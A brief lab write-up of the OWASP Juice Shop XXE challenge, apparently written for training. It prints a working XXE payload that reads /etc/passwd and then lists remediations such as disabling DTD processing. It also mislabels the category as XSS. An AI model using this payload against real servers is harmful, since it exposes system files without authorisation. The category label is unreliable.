# Juice Shop Write-up: XXE Data Access Challenge

## Challenge Details

**Difficulty** : ✯✯✯.\
**Category** : XSS

**Description**

- Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server.
  
## Solution

- Submit an xml file with XXE injection, since it is a linux machine that juiceshop is running on currently we will pull the /etc/passwd file.

 ```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

## Remediation

- **Disable DTD Processing**: Prevent the XML parser from processing Document Type Definitions (DTDs). This stops the parser from interpreting external entities.

- **Switch to JSON APIs**: Where feasible, replace XML-based APIs with JSON-based alternatives. JSON does not support external entities, thus eliminating the risk of XXE attacks.

- **Validate XML Input**: Implement strict validation of all XML input to ensure that it does not contain any references to external entities. This can be done by using schemas or other validation techniques.
  
